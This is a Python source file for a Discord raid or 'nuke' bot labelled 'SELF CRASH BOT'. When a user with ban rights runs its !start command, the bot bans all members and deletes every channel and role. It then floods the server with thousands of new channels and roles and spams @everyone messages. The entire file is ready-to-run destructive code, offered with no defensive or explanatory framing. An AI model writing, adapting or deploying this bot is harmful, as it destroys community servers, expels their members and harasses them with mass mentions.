import discord
from discord.ext import commands
from asyncio import create_task

intents = discord.Intents.all()
intents.members = True
client = commands.Bot(command_prefix='!', intents=intents)
token = ""

@client.event
async def on_ready():
    print_bot("Initialized.")


@client.event
async def on_guild_join(guild):
    print_bot(f"Invited to `{guild.name}`")


@commands.has_permissions(ban_members=True)
@client.command()
async def start(ctx):
    print_bot("Crash command executed!")
    await ctx.message.delete()

    with open('image.png') as image:
        await ctx.guild.edit(name="Your Text", icon=image.read())

    create_task(banAll(ctx))
    create_task(deleteChannels(ctx))
    create_task(deleteRoles(ctx))


async def deleteChannels(ctx):
    for channels in ctx.guild.channels:
        try:
            await channels.delete(reason="Your Text")
            print_bot(f"`{channels.name}` Has been deleted.")
        except:
            print_bot(f"Unable to delete this channel `{channels.name}`")
            pass

    create_task(createChannels(ctx))


async def deleteRoles(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete(reason="Your Text")
            print_bot(f"`{role.name}` Has been deleted.")
        except:
            print_bot(f"This role `{role.name}` cannot be deleted.")
            pass

    create_task(createRoles(ctx))


async def banAll(ctx):
    for member in ctx.guild.members:
        await member.ban(reason="Your Text")
        print_bot(f"`{member.name}` Has been banned.")


async def createChannels(ctx):
    for channels in range(9999):
        try:
            channel = await ctx.guild.create_text_channel('Your Text')
            create_task(spamMessage(channel))
            print_bot("Channel has been created.")
        except:
            print_bot(f"Unable to create channel.")
            pass


async def createRoles(ctx):
    for roles in range(9999):
        try:
            await ctx.guild.create_role(name="Your Text")
            print_bot("Role created.")
        except:
            print_bot(f"Can't create role.")
            pass


async def spamMessage(channel):
    allowed_mentions = discord.AllowedMentions(everyone=True)
    for messages in range(9999):
        try:
            await channel.send("Your Text", allowed_mentions=allowed_mentions)
            print_bot("Message sent.")
        except:
            print_bot(f"Unable to send message.")
            pass


def print_bot(text):
     print(f"[SELF CRASH BOT]: {text}")


client.run(token)